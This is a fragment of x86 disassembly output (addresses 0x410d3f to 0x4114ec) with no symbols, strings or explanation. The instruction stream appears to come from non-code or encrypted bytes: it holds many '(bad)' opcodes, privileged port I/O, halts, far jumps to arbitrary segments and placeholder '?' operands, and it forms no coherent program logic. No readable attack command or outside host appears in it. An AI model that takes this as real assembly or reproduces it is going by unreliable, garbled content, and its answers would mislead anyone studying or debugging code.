  410d3f:	lods   al,BYTE PTR ds:[esi]
  410d40:	ja     0x410daa
  410d42:	call   0xaee0ca7d
  410d47:	dec    esp
  410d48:	je     0x410cea
  410d4a:	lahf   
  410d4b:	push   es
  410d4c:	out    0xe,eax
  410d4e:	or     al,0x16
  410d50:	dec    ebx
  410d51:	or     BYTE PTR [ecx+0x129edb6e],al
  410d57:	sbb    DWORD PTR [ebx+0x2e],esi
  410d5a:	out    0xfb,al
  410d5c:	enter  0x97bb,0xf9
  410d60:	pop    ds
  410d61:	mov    DWORD PTR [edx+0x26c71c5b],0xe22cc32a
  410d6b:	ficom  WORD PTR [ecx]
  410d6d:	cld    
  410d6e:	std    
  410d6f:	mov    eax,ds:0x2f145abd
  410d74:	lock popf 
  410d76:	popa   
  410d77:	stos   DWORD PTR es:[edi],eax
  410d78:	pop    eax
  410d79:	pop    es
  410d7a:	jb     0x410d00
  410d7c:	cmp    edx,esp
  410d7e:	loop   0x410d88
  410d80:	scas   eax,DWORD PTR es:[edi]
  410d81:	add    eax,0xf79ed41f
  410d86:	(bad)  
  410d87:	push   ebx
  410d88:	clc    
  410d89:	sub    ebp,DWORD PTR [edx]
  410d8b:	test   BYTE PTR [edi+0x35a5c7fb],bl
  410d91:	pop    esp
  410d92:	jno    0x410d4b
  410d94:	mov    al,ds:0xd6b0b83d
  410d99:	mov    dl,0x63
  410d9b:	enter  0x4c7f,0x40
  410d9f:	lods   eax,DWORD PTR ds:[esi]
  410da0:	pop    eax
  410da1:	cwde   
  410da2:	fdiv   QWORD PTR [eax-0x7a]
  410da5:	sbb    DWORD PTR [edx+ecx*2],ecx
  410da8:	out    0x2c,eax
  410daa:	inc    esi
  410dab:	cmc    
  410dac:	jecxz  0x410d56
  410dae:	loope  0x410d62
  410db0:	push   es
  410db1:	mov    ah,0x6a
  410db3:	jecxz  0x410db4
  410db5:	inc    esp
  410db6:	cmp    ch,BYTE PTR [eax+0x5c]
  410db9:	and    al,0x7
  410dbb:	mov    al,0x7f
  410dbd:	mov    DWORD PTR [ebx-0x16],esp
  410dc0:	jbe    0x410d46
  410dc2:	nop
  410dc3:	imul   esp,esi,0xa56186e4
  410dc9:	out    dx,eax
  410dca:	scas   al,BYTE PTR es:[edi]
  410dcb:	inc    esi
  410dcc:	xchg   edx,eax
  410dcd:	xchg   ebp,eax
  410dce:	loopne 0x410e3c
  410dd0:	sar    DWORD PTR ds:[eax+0x28],1
  410dd4:	and    eax,0xa9fd0e15
  410dd9:	aaa    
  410dda:	out    dx,eax
  410ddb:	jge    0x410d9a
  410ddd:	dec    edx
  410dde:	mov    bh,0xb6
  410de0:	pop    eax
  410de1:	dec    edi
  410de2:	xchg   BYTE PTR [edx+eiz*8+0x33],al
  410de6:	pop    esi
  410de7:	sbb    al,0x2a
  410de9:	jo     0x410da8
  410deb:	sbb    DWORD PTR [ecx-0x30f686d2],ecx
  410df1:	pop    edi
  410df2:	ins    BYTE PTR es:[edi],dx
  410df3:	popf   
  410df4:	push   es
  410df5:	pop    ss
  410df6:	adc    edx,DWORD PTR [esi]
  410df8:	add    edx,ebx
  410dfa:	mov    edx,DWORD PTR [ecx-0x29809310]
  410e00:	ficom  DWORD PTR [edx-0x1ffb0f61]
  410e06:	shl    DWORD PTR [eax-0x21],0x5c
  410e0a:	mov    edi,DWORD PTR [edi]
  410e0c:	fsub   QWORD PTR [edx-0x47]
  410e0f:	add    al,0x6e
  410e11:	dec    edi
  410e12:	hlt    
  410e13:	sbb    dl,dh
  410e15:	jp     0x410e5f
  410e17:	test   al,0xc3
  410e19:	mov    DWORD PTR cs:[ebp+0x40],edi
  410e1d:	push   es
  410e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e1f:	jecxz  0x410e13
  410e21:	int    0x2b
  410e23:	stc    
  410e24:	inc    esi
  410e25:	sbb    al,BYTE PTR ds:0xcd65391b
  410e2b:	mov    ebx,0x5ac50773
  410e30:	fcomp  st(3)
  410e32:	das    
  410e33:	(bad)  
  410e34:	outs   dx,BYTE PTR ds:[esi]
  410e35:	retf   0x8ad2
  410e38:	aam    0x95
  410e3a:	data16 jecxz 0x410e39
  410e3d:	mov    ds:0xc354326a,eax
  410e42:	shl    edi,0x12
  410e45:	mov    ecx,0xad25b973
  410e4a:	mov    edx,0xaa3d04fb
  410e4f:	int    0x54
  410e51:	or     eax,0x9e294aae
  410e56:	adc    al,ch
  410e58:	xchg   esi,eax
  410e59:	icebp  
  410e5a:	ins    DWORD PTR es:[edi],dx
  410e5b:	add    eax,ecx
  410e5d:	mov    edx,0x269f177a
  410e62:	cmp    dl,BYTE PTR ss:[ebp-0xd177f8f]
  410e69:	cmp    DWORD PTR [ecx+0x1],ecx
  410e6c:	mov    cl,0x2b
  410e6e:	in     al,dx
  410e6f:	retf   0xaeb6
  410e72:	cmp    BYTE PTR [ecx+0x2545203d],ah
  410e78:	ins    BYTE PTR es:[edi],dx
  410e79:	(bad)  [ebx+0x62]
  410e7c:	arpl   WORD PTR [esi-0x16],di
  410e7f:	or     dh,cl
  410e81:	inc    edi
  410e82:	sub    ch,dh
  410e84:	jo     0x410e0d
  410e86:	int3   
  410e87:	repz (bad) [eax+0x2cbb31cd]
  410e8e:	int    0x8c
  410e90:	and    DWORD PTR [eax+0xa725956],0xffffffb7
  410e97:	popf   
  410e98:	adc    ecx,DWORD PTR [eax-0x58]
  410e9b:	inc    ebp
  410e9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e9d:	adc    DWORD PTR [esi+0x2e4c9f8],esi
  410ea3:	aaa    
  410ea4:	cdq    
  410ea5:	repnz or DWORD PTR [eax+0x41],0xed6071af
  410ead:	mov    esi,0x9209edd6
  410eb2:	add    ebp,DWORD PTR [ebp+0x25]
  410eb5:	aad    0x3f
  410eb7:	rol    DWORD PTR [esp+edx*2+0x63],1
  410ebb:	inc    ebx
  410ebc:	mov    di,es
  410ebf:	sub    ah,BYTE PTR [edi]
  410ec1:	xor    al,BYTE PTR [ebx-0x2b]
  410ec4:	jle    0xaa018cbd
  410eca:	jae    0x410eff
  410ecc:	lods   al,BYTE PTR ds:[esi]
  410ecd:	imul   ecx,ecx,0xffffffea
  410ed0:	mov    bh,0x5f
  410ed2:	pusha  
  410ed3:	out    0x1d,al
  410ed5:	dec    esi
  410ed6:	dec    edx
  410ed7:	inc    ebp
  410ed8:	out    0xf8,al
  410eda:	mov    ch,0xf2
  410edc:	retf   0x57a0
  410edf:	dec    esi
  410ee0:	push   edx
  410ee1:	sti    
  410ee2:	rcr    esp,0x9c
  410ee5:	popf   
  410ee6:	push   ss
  410ee7:	jb     0x410f47
  410ee9:	ja     0x410ed6
  410eeb:	(bad)  
  410eec:	adc    esp,DWORD PTR [ecx]
  410eee:	jno    0x410f34
  410ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ef1:	sub    BYTE PTR [edi+0x71e38a0a],0x4a
  410ef8:	push   0x1c
  410efa:	in     al,0x5e
  410efc:	push   cs
  410efd:	loopne 0x410f7c
  410eff:	in     al,0x3b
  410f01:	sub    DWORD PTR [ebx-0x2dd42636],ebp
  410f07:	xchg   edx,eax
  410f08:	or     eax,0xa7bffb50
  410f0d:	xchg   edi,eax
  410f0e:	out    0x87,eax
  410f10:	push   esi
  410f11:	mov    ecx,0x6efe9ff8
  410f16:	mov    ebp,0x4e6e8a4c
  410f1b:	sar    DWORD PTR [edx],1
  410f1d:	retf   
  410f1e:	mov    al,ds:0xeb82abb4
  410f23:	sbb    al,0x56
  410f25:	dec    ebp
  410f26:	or     al,0xa
  410f28:	dec    eax
  410f29:	jmp    0xc72f:0x7aa67f9f
  410f30:	xchg   BYTE PTR [eax+0x50],ah
  410f33:	add    bh,BYTE PTR [esi+0x5b]
  410f36:	(bad)  [ebp+0x7ed73e7f]
  410f3c:	aaa    
  410f3d:	and    DWORD PTR [ebp+0x57],edx
  410f40:	adc    edx,DWORD PTR [eax]
  410f42:	jmp    0x20dfca0d
  410f47:	fcomp  DWORD PTR [eax]
  410f49:	fidiv  DWORD PTR [esi]
  410f4b:	inc    ebp
  410f4c:	retf   0xde09
  410f4f:	pop    ds
  410f50:	test   BYTE PTR [esi*1+0x328625c6],0xa9
  410f58:	loop   0x410f12
  410f5a:	xor    BYTE PTR [edi],bh
  410f5c:	cmp    cl,BYTE PTR [ebx+eax*2-0x13]
  410f60:	or     al,0x99
  410f62:	in     eax,0x80
  410f64:	inc    ecx
  410f65:	popf   
  410f66:	mov    eax,0xcb1b73e7
  410f6b:	sti    
  410f6c:	mov    edi,ss
  410f6e:	ss cmp al,0x22
  410f71:	jle    0x410fde
  410f73:	dec    ecx
  410f74:	jge    0x410f82
  410f76:	shr    BYTE PTR [edi+0x56],cl
  410f79:	pop    ss
  410f7a:	ret    0x16ef
  410f7d:	xchg   edx,eax
  410f7e:	push   ebp
  410f7f:	stos   DWORD PTR es:[edi],eax
  410f80:	pop    ebp
  410f81:	jecxz  0x410f83
  410f83:	out    dx,eax
  410f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f85:	fcom   DWORD PTR [ecx+0x63]
  410f88:	jmp    0xf2f80edf
  410f8d:	add    ecx,DWORD PTR [ecx]
  410f8f:	stc    
  410f90:	mov    eax,0x493daee2
  410f95:	scas   eax,DWORD PTR es:[edi]
  410f96:	mov    BYTE PTR [eax-0xe0334a8],ah
  410f9c:	mov    dl,0x8a
  410f9e:	in     al,dx
  410f9f:	arpl   WORD PTR [eax+edi*2+0x18],si
  410fa3:	cmp    eax,0xa0c72634
  410fa8:	push   ecx
  410fa9:	call   0x886d:0x612c8309
  410fb0:	das    
  410fb1:	fdiv   QWORD PTR [edi*2-0x2a033c28]
  410fb8:	mov    ds:0x3a273e07,eax
  410fbd:	neg    DWORD PTR [esi+0x279df2dc]
  410fc3:	inc    ebx
  410fc4:	cld    
  410fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fc6:	mov    ah,0xc8
  410fc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fc9:	test   DWORD PTR [ebp+0x1c],eax
  410fcc:	jle    0x411007
  410fce:	push   eax
  410fcf:	jae    0x410f82
  410fd1:	jge    0x410fa0
  410fd3:	das    
  410fd4:	loopne 0x410f9f
  410fd6:	inc    edi
  410fd7:	and    eax,0x15e4e635
  410fdc:	ja     0x411043
  410fde:	cmp    al,0xe3
  410fe0:	mov    ebx,0xf8b5d6d4
  410fe5:	stos   WORD PTR es:[edi],ax
  410fe7:	dec    esp
  410fe8:	cmp    ah,BYTE PTR [esi-0x6d]
  410feb:	sbb    eax,0x80091f43
  410ff0:	xor    BYTE PTR [edi],bh
  410ff2:	mov    ah,0xc5
  410ff4:	fist   WORD PTR [eax-0x21]
  410ff7:	and    DWORD PTR [edx-0x68e264f3],ebx
  410ffd:	outs   dx,DWORD PTR ds:[esi]
  410ffe:	and    al,0x35
  411000:	sbb    eax,0xbdc064ff
  411005:	addr16 adc al,0xfe
  411008:	jecxz  0x41107f
  41100a:	shr    DWORD PTR [edx+0x48],cl
  41100d:	or     BYTE PTR [esi+0x36],ah
  411010:	sti    
  411011:	pop    ecx
  411012:	(bad)  
  411013:	mov    ebp,0x2d7e67f2
  411018:	dec    edi
  411019:	scas   al,BYTE PTR es:[edi]
  41101a:	rcr    ch,1
  41101c:	(bad)  
  41101d:	(bad)  
  41101e:	hlt    
  41101f:	rcr    BYTE PTR [eax],0x15
  411022:	adc    al,0x38
  411024:	or     BYTE PTR [eax+0x7f7fa836],bh
  41102a:	sub    al,0xc1
  41102c:	mov    edx,0x73b4c963
  411031:	nop
  411032:	and    BYTE PTR [edi-0x16],bl
  411035:	inc    ebp
  411036:	mov    ss,WORD PTR [ecx]
  411038:	std    
  411039:	lea    ebx,[edx+eiz*1]
  41103c:	mov    edi,0x3e542385
  411041:	adc    BYTE PTR [esp+ebp*4-0x57aa30b7],al
  411048:	mov    ecx,0x220b5af9
  41104d:	cmp    DWORD PTR [ebx-0x46],eax
  411050:	xchg   edx,eax
  411051:	cmp    DWORD PTR [edx+0x76],esp
  411054:	cdq    
  411055:	add    dl,BYTE PTR [eax+eiz*1-0x3c]
  411059:	stos   BYTE PTR es:[edi],al
  41105a:	imul   edi,DWORD PTR [ecx-0x70],0xf
  41105e:	sbb    BYTE PTR [edx],ch
  411060:	sub    ebx,DWORD PTR [edx]
  411062:	les    edi,FWORD PTR [eax]
  411064:	lds    edx,FWORD PTR [edx]
  411066:	inc    esp
  411067:	rcl    BYTE PTR [ecx+ecx*1-0x2e],cl
  41106b:	cmp    al,0xbe
  41106d:	iret   
  41106e:	sbb    ebx,DWORD PTR [esi]
  411070:	ss jb  0x4110a9
  411073:	fadd   DWORD PTR [edi+0x47c44ecc]
  411079:	mov    ebp,DWORD PTR [edx]
  41107b:	ja     0x4110ce
  41107d:	shl    edi,1
  41107f:	(bad)  
  411080:	jg     0x411030
  411082:	xor    eax,0xf618a575
  411087:	jbe    0x411022
  411089:	bound  eax,QWORD PTR [eax+0x3e]
  41108c:	jecxz  0x41104f
  41108e:	aaa    
  41108f:	ficomp WORD PTR [edx+0x53]
  411092:	pop    edx
  411093:	mov    ds:0xcaf5fa71,eax
  411098:	fld    DWORD PTR [edx+eax*1+0x4b33ac84]
  41109f:	lds    ebp,FWORD PTR [edx+0x7a]
  4110a2:	test   eax,0xaa12743a
  4110a7:	outs   dx,BYTE PTR ds:[esi]
  4110a8:	mov    cl,0xb2
  4110aa:	mov    bh,0xca
  4110ac:	out    0x33,al
  4110ae:	push   edi
  4110af:	sub    al,BYTE PTR [esi-0x70]
  4110b2:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b4:	out    0xf3,al
  4110b6:	jl     0x4110f8
  4110b8:	mov    cl,0xd0
  4110ba:	imul   ecx,edi,0xffffffbd
  4110bd:	push   ebx
  4110be:	xchg   esp,eax
  4110bf:	xchg   edx,eax
  4110c0:	jmp    0x41108c
  4110c2:	mov    cl,0x61
  4110c4:	es retf 
  4110c6:	je     0x411138
  4110c8:	add    dl,BYTE PTR [esi-0x7ff2e8a8]
  4110ce:	inc    esi
  4110cf:	xchg   BYTE PTR [edx],dh
  4110d1:	or     eax,0x19f0c6ad
  4110d6:	sbb    al,0x5e
  4110d8:	or     esp,DWORD PTR [ecx]
  4110da:	or     DWORD PTR [eax-0x50],edi
  4110dd:	xlat   BYTE PTR ds:[ebx]
  4110de:	push   ebx
  4110df:	mov    ecx,0xab47bc9a
  4110e4:	push   esp
  4110e5:	mov    esi,0xded93fed
  4110ea:	sbb    BYTE PTR [ecx],ah
  4110ec:	retf   
  4110ed:	dec    esi
  4110ee:	jge    0x411138
  4110f0:	push   ecx
  4110f1:	aas    
  4110f2:	inc    eax
  4110f3:	dec    ebp
  4110f4:	push   esi
  4110f5:	not    ebx
  4110f7:	add    eax,0x367385d4
  4110fc:	xor    DWORD PTR [ebx+0x64],0xffffffb5
  411100:	xchg   DWORD PTR [edi],ebx
  411102:	test   eax,0x69998c85
  411107:	out    0x3,eax
  411109:	sub    DWORD PTR [edi],0xffffffec
  41110c:	jb     0x41118b
  41110e:	cdq    
  41110f:	xor    eax,0xd4e2c763
  411114:	aaa    
  411115:	cs inc esp
  411117:	ins    DWORD PTR es:[edi],dx
  411118:	push   ebx
  411119:	cwde   
  41111a:	cmp    ch,BYTE PTR [ebp-0x3f405d5]
  411120:	ins    DWORD PTR es:[edi],dx
  411121:	(bad)  
  411122:	outs   dx,DWORD PTR ds:[esi]
  411123:	xchg   edx,eax
  411124:	pop    es
  411125:	and    BYTE PTR [bx+0x12],al
  411129:	sbb    ecx,DWORD PTR [edx+eiz*4]
  41112c:	inc    edx
  41112d:	pop    edx
  41112e:	retf   0xa085
  411131:	icebp  
  411132:	loopne 0x4110e7
  411134:	xchg   ebx,eax
  411135:	mov    cl,0x2f
  411137:	push   cs
  411138:	shl    BYTE PTR [ecx+esi*8+0x4f],0x87
  41113d:	jo     0x41113c
  41113f:	jmp    0x4111a7
  411141:	pop    ss
  411142:	hlt    
  411143:	sahf   
  411144:	imul   esi,ecx,0xffffff92
  411147:	xchg   esi,eax
  411148:	mov    ecx,0x5a05758d
  41114d:	mov    esi,DWORD PTR [esi]
  41114f:	add    al,0x13
  411151:	and    BYTE PTR [eax+0x6072566a],dh
  411157:	and    DWORD PTR [ecx],0xffffff8a
  41115a:	inc    ebp
  41115b:	add    BYTE PTR [edi+0x29],0x8
  41115f:	out    0x45,eax
  411161:	xchg   ecx,eax
  411162:	mov    cl,0x93
  411164:	mov    ebp,0xd03ac763
  411169:	push   eax
  41116a:	mov    bl,0x83
  41116c:	loop   0x4111a0
  41116e:	inc    ecx
  41116f:	data16 aas 
  411171:	cwde   
  411172:	pop    esp
  411173:	ins    DWORD PTR es:[edi],dx
  411174:	mov    BYTE PTR [edi+0x58656a3c],ah
  41117a:	ret    0x83fd
  41117d:	fs enter 0x45e6,0x5b
  411182:	adc    esp,esp
  411184:	xchg   DWORD PTR [edx+0x38],ecx
  411187:	(bad)  
  411188:	sub    BYTE PTR [esi+0x1211d420],al
  41118e:	dec    edx
  41118f:	hlt    
  411190:	mov    bl,BYTE PTR [esi-0x9]
  411193:	sbb    esp,DWORD PTR [eax]
  411195:	ja     0x41115d
  411197:	mov    esi,DWORD PTR [ebx+eiz*8+0x77]
  41119b:	addr16 adc esi,0x3d
  41119f:	into   
  4111a0:	jge    0x41118a
  4111a2:	push   edx
  4111a3:	ja     0x41112d
  4111a5:	inc    ebx
  4111a6:	pop    ds
  4111a7:	pcmpeqw mm2,mm5
  4111aa:	repnz or al,0x2a
  4111ad:	push   ecx
  4111ae:	ret    
  4111af:	pop    edi
  4111b0:	dec    eax
  4111b1:	gs iret 
  4111b3:	fwait
  4111b4:	cmp    eax,0x4ed585dd
  4111b9:	or     DWORD PTR [ecx+ecx*4-0xcab3502],edx
  4111c0:	and    dh,dh
  4111c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111c3:	mov    ah,0x6d
  4111c5:	retf   0xea9f
  4111c8:	loop   0x4111fb
  4111ca:	shr    DWORD PTR [edx+0x6d],0x73
  4111ce:	sar    DWORD PTR [ebx],0xc5
  4111d1:	mov    edx,0xe2736575
  4111d6:	and    BYTE PTR [eax+0x5ea6474d],dh
  4111dc:	mov    ds:0x987cef11,al
  4111e1:	inc    ecx
  4111e2:	jge    0x41123b
  4111e4:	xor    BYTE PTR [edi-0x14],ah
  4111e7:	jo     0x411210
  4111e9:	imul   ebp,eax,0x179b0229
  4111ef:	or     ecx,DWORD PTR [esi+esi*1-0xb]
  4111f3:	sbb    al,0xe2
  4111f5:	and    ebp,esp
  4111f7:	(bad)  
  4111f8:	fwait
  4111f9:	scas   al,BYTE PTR es:[edi]
  4111fa:	sbb    DWORD PTR [ebp+0x55],ecx
  4111fd:	mov    eax,ds:0xe7935f3e
  411202:	test   DWORD PTR [ecx-0x6cf0c357],0x663e04cc
  41120c:	sub    ch,BYTE PTR [ebp+0x4e8f66cf]
  411212:	imul   edi,edx,0x79fe7e15
  411218:	sbb    bl,BYTE PTR [ecx]
  41121a:	inc    edx
  41121b:	call   0xd884:0x30154089
  411222:	nop
  411223:	arpl   ax,ax
  411225:	shr    DWORD PTR [ebp-0x6153bcaf],cl
  41122b:	sar    BYTE PTR [edx+eiz*4+0x7b74fae2],0x6a
  411233:	int    0xbe
  411235:	inc    edx
  411236:	les    eax,FWORD PTR [ecx-0x4d]
  411239:	icebp  
  41123a:	and    WORD PTR [edi-0x3e],si
  41123e:	in     al,0x67
  411240:	leave  
  411241:	sbb    edi,esp
  411243:	out    dx,al
  411244:	mov    al,0xa2
  411246:	or     ebx,DWORD PTR [ecx+0x2fc187af]
  41124c:	or     ah,dh
  41124e:	mov    esi,0xca9af95f
  411253:	scas   al,BYTE PTR es:[edi]
  411254:	inc    ecx
  411255:	scas   al,BYTE PTR es:[edi]
  411256:	inc    ebp
  411257:	mov    ebp,esp
  411259:	leave  
  41125a:	mov    bh,0x24
  41125c:	into   
  41125d:	mov    eax,ds:0x89c44d1e
  411262:	ficomp WORD PTR [ebp+0x63]
  411265:	ds push cs
  411267:	cmp    BYTE PTR [edx],dh
  411269:	mov    ebp,0x7ca01675
  41126e:	enter  0x867a,0xef
  411272:	gs stos BYTE PTR es:[edi],al
  411274:	lods   al,BYTE PTR ds:[esi]
  411275:	sahf   
  411276:	pusha  
  411277:	sti    
  411278:	push   ebp
  411279:	and    al,0x68
  41127b:	sub    eax,0x417795b9
  411280:	add    eax,0x212d243f
  411285:	xchg   BYTE PTR [ebx+eax*8-0xc4033d1],ah
  41128c:	loope  0x411232
  41128e:	es mov ebx,0x4af5f8eb
  411294:	imul   ebx,DWORD PTR [eax-0x49d4739e],0x33
  41129b:	repnz lods al,BYTE PTR ds:[esi]
  41129d:	push   edx
  41129e:	rcl    BYTE PTR [edx],1
  4112a0:	out    dx,al
  4112a1:	rol    ebp,0x53
  4112a4:	or     bh,BYTE PTR ds:0xf58f428a
  4112aa:	jmp    0x411316
  4112ac:	mov    ebp,0xcdef06d5
  4112b1:	icebp  
  4112b2:	lods   eax,DWORD PTR ds:[esi]
  4112b3:	and    DWORD PTR [ecx+0x49bf7636],0xffffffbc
  4112ba:	ja     0x4112e3
  4112bc:	jecxz  0x41132f
  4112be:	mov    cl,0xf2
  4112c0:	outs   dx,BYTE PTR ds:[esi]
  4112c1:	mov    ds:0xf8ab38b,al
  4112c6:	dec    esi
  4112c7:	in     eax,dx
  4112c8:	cld    
  4112c9:	inc    ecx
  4112ca:	inc    eax
  4112cb:	arpl   WORD PTR [edx],di
  4112cd:	arpl   WORD PTR [edx-0x29f2174a],si
  4112d3:	bound  eax,QWORD PTR [edi]
  4112d5:	loope  0x4112d1
  4112d7:	xchg   esi,eax
  4112d8:	push   esp
  4112d9:	gs sahf 
  4112db:	fimul  DWORD PTR [edx-0x7e032b8c]
  4112e1:	and    dh,BYTE PTR [ebx]
  4112e3:	cld    
  4112e4:	add    BYTE PTR [ecx],bh
  4112e6:	shr    BYTE PTR [ecx+0x6d6c11bc],0x29
  4112ed:	mov    edx,0x24133474
  4112f2:	lahf   
  4112f3:	dec    edi
  4112f4:	js     0x411327
  4112f6:	inc    edi
  4112f7:	loop   0x41132a
  4112f9:	test   DWORD PTR [ebx-0x2575e77],edx
  4112ff:	xor    ah,BYTE PTR [edx-0x7b5bc1cd]
  411305:	fnstsw WORD PTR [ecx+0x25]
  411308:	fs cld 
  41130a:	dec    ecx
  41130b:	pusha  
  41130c:	xlat   BYTE PTR ds:[ebx]
  41130d:	retf   0x8bed
  411310:	xchg   esp,eax
  411311:	xchg   ebp,eax
  411312:	xor    DWORD PTR [eax-0x33],esp
  411315:	les    edi,FWORD PTR [esi+0x46]
  411318:	in     al,dx
  411319:	out    0xda,al
  41131b:	repnz cmp edx,ebx
  41131e:	rcr    ebx,1
  411320:	xchg   ecx,eax
  411321:	xchg   DWORD PTR [ebx],esi
  411323:	pop    ebx
  411324:	sub    dh,ch
  411326:	xchg   DWORD PTR [edi-0x58],esp
  411329:	rol    esi,cl
  41132b:	mov    WORD PTR [ecx],ds
  41132d:	mov    edx,0x7ad7a717
  411332:	ds push ebp
  411334:	outs   dx,BYTE PTR ds:[esi]
  411335:	les    esi,FWORD PTR [eax+0x6cf1dbde]
  41133b:	xchg   DWORD PTR [ebp+0x2f],edi
  41133e:	ins    DWORD PTR es:[edi],dx
  41133f:	ja     0x4113a2
  411341:	mov    DWORD PTR [eax+0x76],esp
  411344:	pop    es
  411345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411346:	xchg   esi,eax
  411347:	push   0xe7122d1a
  41134c:	aam    0xe7
  41134e:	mov    dl,0xa
  411350:	push   ebx
  411351:	fcomp  QWORD PTR [eax+0x72]
  411354:	push   ebx
  411355:	repz retf 
  411357:	imul   ebp,DWORD PTR [eax-0x61],0x777c64dd
  41135e:	or     DWORD PTR ds:0xb25bfa7,esp
  411364:	imul   ecx,DWORD PTR [edx],0xfffffffa
  411367:	hlt    
  411368:	pop    eax
  411369:	push   esp
  41136a:	push   ecx
  41136b:	mov    eax,0x6621e7
  411370:	sbb    bl,ch
  411372:	ret    0x6c61
  411375:	jle    0x4113f4
  411377:	nop
  411378:	pop    esp
  411379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41137a:	sbb    BYTE PTR [edx+0xe],ah
  41137d:	jne    0x4113dc
  41137f:	hlt    
  411380:	adc    ecx,DWORD PTR [ebx*1-0x40c8bd66]
  411387:	jns    0x41138f
  411389:	shr    esp,1
  41138b:	push   ecx
  41138c:	cli    
  41138d:	adc    bl,al
  41138f:	mov    esi,0x43da2db3
  411394:	push   ds
  411395:	dec    ecx
  411396:	ret    0x6c51
  411399:	push   esp
  41139a:	add    BYTE PTR [eax+esi*1+0x4596b5e],ch
  4113a1:	ins    BYTE PTR es:[edi],dx
  4113a2:	ficomp DWORD PTR [ebp-0x1f]
  4113a5:	ficom  DWORD PTR [edx+0x2e96c02f]
  4113ab:	arpl   cx,cx
  4113ad:	pop    ebp
  4113ae:	(bad)
  4113b1:	test   al,0xf2
  4113b3:	dec    esi
  4113b4:	pop    ds
  4113b5:	push   ss
  4113b6:	cmp    DWORD PTR [edi+edx*8-0x18],eax
  4113ba:	sub    eax,0xd8676028
  4113bf:	clc    
  4113c0:	inc    ecx
  4113c1:	or     al,0x26
  4113c3:	mov    dl,0x3
  4113c5:	jecxz  0x41135a
  4113c7:	call   0xf468:0x145b63a0
  4113ce:	sbb    BYTE PTR [edi+eiz*4+0x60],ah
  4113d2:	add    dl,dh
  4113d4:	xchg   ecx,eax
  4113d5:	jge    0x4113ab
  4113d7:	retf   0xbeb0
  4113da:	fs popf 
  4113dc:	xchg   ebp,eax
  4113dd:	call   0x98b8bae6
  4113e2:	jo     0x411429
  4113e4:	push   ds
  4113e5:	jg     0x4113b3
  4113e7:	jno    0x4113c7
  4113e9:	jbe    0x4113cb
  4113eb:	ins    DWORD PTR es:[edi],dx
  4113ec:	fsubrp st(5),st
  4113ee:	(bad)  
  4113ef:	es popf 
  4113f1:	ret    0x466b
  4113f4:	mov    ?,WORD PTR [edx+0x67]
  4113f7:	xchg   ebp,eax
  4113f8:	mov    esp,0x90a61e68
  4113fd:	cmp    ebx,DWORD PTR [ecx+esi*4+0x71]
  411401:	pop    ecx
  411402:	pop    es
  411403:	(bad)  
  411404:	xor    eax,0xd360dd1c
  411409:	jl     0x411488
  41140b:	push   ecx
  41140c:	sbb    esp,ebx
  41140e:	inc    eax
  41140f:	leave  
  411410:	stc    
  411411:	mov    ds:0xceba74e,al
  411416:	sbb    DWORD PTR [eax-0x4d],eax
  411419:	add    eax,0xd9e96876
  41141e:	add    eax,0x5ac4b1d6
  411423:	xor    eax,0xc91872e4
  411428:	stos   BYTE PTR es:[edi],al
  411429:	pop    ss
  41142a:	pop    di
  41142c:	push   ss
  41142d:	aas    
  41142e:	rol    DWORD PTR [edi+0x44],1
  411431:	inc    BYTE PTR ds:[ecx-0x200cf129]
  411438:	inc    eax
  411439:	inc    eax
  41143a:	pcmpeqd mm2,QWORD PTR [esi-0x3]
  41143e:	mov    al,0x69
  411440:	stos   DWORD PTR es:[edi],eax
  411441:	fldenv [edx-0x58bdf8e5]
  411447:	pop    es
  411448:	sub    ebx,DWORD PTR [esi-0xa36d2cb]
  41144e:	jge    0x411483
  411450:	gs cmc 
  411452:	mov    al,0x67
  411454:	dec    ecx
  411455:	out    0xbe,al
  411457:	inc    ebp
  411458:	sub    BYTE PTR [eax],0xa
  41145b:	sbb    DWORD PTR [edi],ebp
  41145d:	lods   al,BYTE PTR ds:[esi]
  41145e:	rcr    DWORD PTR [ebp-0x45],0x70
  411462:	data16 aas 
  411464:	push   ecx
  411465:	fdiv   DWORD PTR [edx-0x6f6b9510]
  41146b:	shl    BYTE PTR [edi-0x3],1
  41146e:	dec    edi
  41146f:	add    DWORD PTR [ecx+ebx*1+0x5e807034],esp
  411476:	stos   BYTE PTR es:[edi],al
  411477:	mov    WORD PTR ds:0xc2db4970,?
  41147d:	test   DWORD PTR [ebx-0x52],0xf4d54294
  411484:	aas    
  411485:	es mov dh,0xda
  411488:	(bad)  
  411489:	inc    cx
  41148b:	sbb    dl,BYTE PTR [edx]
  41148d:	xlat   BYTE PTR ds:[ebx]
  41148e:	das    
  41148f:	out    0x12,eax
  411491:	sub    esi,DWORD PTR [ecx+0x117025e4]
  411497:	cmc    
  411498:	sbb    BYTE PTR ds:0x1803675e,dh
  41149e:	sbb    eax,0xf57dc6cd
  4114a3:	iret   
  4114a4:	fadd   DWORD PTR [ebp+0x2c]
  4114a7:	imul   esi,DWORD PTR [eax],0xc0f3bbb6
  4114ad:	mov    dh,BYTE PTR [esi+0x50ccf3ef]
  4114b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b4:	fcomp  QWORD PTR [edx+ebx*8+0x8]
  4114b8:	mov    dh,0xe6
  4114ba:	adc    BYTE PTR [ebx-0x5],al
  4114bd:	mov    bl,0xbd
  4114bf:	movlps QWORD PTR [esi-0x38],xmm7
  4114c3:	in     al,0x99
  4114c5:	in     eax,dx
  4114c6:	push   ss
  4114c7:	imul   edi,DWORD PTR [ebx+0x17072a05],0x9a43969e
  4114d1:	imul   BYTE PTR [edx-0x4e]
  4114d4:	les    esi,FWORD PTR ds:0x2d6db051
  4114da:	pop    ebx
  4114db:	call   0x70380976
  4114e0:	fidiv  DWORD PTR [ebx+0x2b]
  4114e3:	xchg   esi,eax
  4114e4:	or     al,0xa0
  4114e6:	test   BYTE PTR [ebx-0x24424b16],cl
  4114ec:	or     al,0x61
